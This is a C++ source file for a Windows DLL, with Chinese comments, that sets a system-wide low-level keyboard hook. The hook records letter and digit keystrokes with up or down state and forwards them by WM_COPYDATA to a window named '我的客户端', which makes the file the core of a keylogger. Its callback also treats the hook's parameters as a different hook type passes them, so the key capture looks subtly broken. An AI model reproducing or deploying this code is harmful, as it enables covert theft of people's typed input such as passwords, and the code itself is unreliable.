// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
HHOOK g_hhk;
HWND g_hwnd;
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	
	if ((wParam>='A'&&wParam<='Z')|| (wParam >= '0'&&wParam <= '9'))
	{
		char a[99] = {0 };
		if ((lParam >> 31) & 1)
		{
			strcat(a,"up---");
		}
		else
		{
			strcat(a, "down-");
		}
		char b[3] = { wParam ,'\t','\0' };
		strcat(a, b);
		//将数据封装起来通过WM_COPYDATA消息发送出去
		COPYDATASTRUCT cds;
		cds.dwData = 0;
		cds.cbData = strlen(a) + 1;
		cds.lpData = a;
		OutputDebugStringA((char*)cds.lpData);
		SendMessageA(g_hwnd, WM_COPYDATA, (WPARAM)g_hwnd, (LPARAM)&cds);
	}
	
	//调用下一个钩子,这是个规范
	return CallNextHookEx(g_hhk, code, wParam, lParam);
}


HINSTANCE g_hModule;
//dll导出函数提供给其他程序使用
BOOL MySetHook()
{
	g_hhk = SetWindowsHookEx(WH_KEYBOARD_LL,//钩子类型：键盘钩子
		(HOOKPROC)KeyboardProc,//回调函数
		g_hModule,//在dll初始化处获得该句柄
		0);//线程id，填0表示勾所有

		if (g_hhk == NULL)
		{
			MessageBoxA(0,"下钩子失败","",0);
			return false;
		}
		OutputDebugStringA("下钩子成功\r\n");
	return true;
}
char a[99] = { 0 };
//dll导出函数提供给其他程序使用
void DllGetHwnd(HWND hWn)
{
	g_hwnd = FindWindow(NULL, L"我的客户端");
	ZeroMemory(a, 99);
	sprintf(a, "\r\ng_hwnd:%X\r\n", g_hwnd);
	OutputDebugStringA(a);
}




BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		g_hModule = hModule;
		g_hwnd = FindWindow(NULL, L"我的客户端");
		ZeroMemory(a, 99);
		sprintf(a, "\r\ng_hwnd:%X\r\n", g_hwnd);
		OutputDebugStringA(a);
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

